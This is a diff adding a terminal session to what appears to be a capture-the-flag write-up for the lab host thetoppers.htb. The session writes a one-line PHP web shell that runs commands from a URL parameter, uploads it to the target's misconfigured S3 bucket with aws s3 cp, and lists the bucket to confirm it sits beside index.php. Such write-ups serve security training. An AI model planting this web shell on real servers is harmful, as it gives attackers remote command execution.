@@ -239,6 +239,32 @@ ff02::2         ip6-allrouters
 
 Question
 ==Answer==
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ vi shell.php  
+
+┌──(kali㉿kali)-[~]
+└─$ cat shell.php          
+<?php system ($_GET['cmd']); ?>
+
+┌──(kali㉿kali)-[~]
+└─$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php sc://thetoppers.htb
+
+usage: aws s3 cp <LocalPath> <S3Uri> or <S3Uri> <LocalPath> or <S3Uri> <S3Uri>
+Error: Invalid argument type
+
+┌──(kali㉿kali)-[~]
+└─$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php             
+
+┌──(kali㉿kali)-[~]
+└─$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb          
+                           PRE images/
+2026-06-14 14:32:59          0 .htaccess
+2026-06-14 14:33:00      11952 index.php
+2026-06-14 16:39:24         32 shell.php
+```
 <div align="center">
 <br>
 <br>
